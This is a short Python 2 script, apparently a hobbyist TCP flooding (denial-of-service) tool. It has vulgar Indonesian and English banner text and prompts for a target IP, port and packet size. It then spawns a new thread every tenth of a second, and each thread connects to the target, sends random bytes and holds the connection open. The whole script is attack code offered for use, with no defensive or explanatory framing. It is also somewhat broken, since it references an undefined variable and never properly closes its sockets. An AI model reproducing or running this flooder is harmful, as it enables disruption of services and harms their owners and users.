#!/system/bin/python
from os import *
from socket import *
from string import *
from time import *
from thread import *
import sys
import os
import random

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
print "== DICK ATTACK STARTED =="
a = '"'
print "==================================="
print "MY NAME IS  [MR.DICK]"
print "CALLL ME INSTAGRAM BITCH! : abcderayfuck"
print "DICK ATTACKING"
print "==================================="
print
print "-Mimin ganteng gak? :'v"
print "-[ M R . D I C K ]-"
print
print "IP NYA KONTOL :v"
host = raw_input("root@dickattack$: ")
print "PORT?:"
port = input("root@dickattack$: ")
print "SENDING PACKETS [M@X 65507]:"
package = input("root@dickattack$: ")
packet = random._urandom(package)


def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sock1.sendto(packet, (ip,port))
        sleep(99)
        sock1.close
    except:
        print "[+] [MR.DICK]"

n = 0


while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "DICK ATTACK"
    print "[+] HAJAR NGENTOT :V"
    sleep(0.1)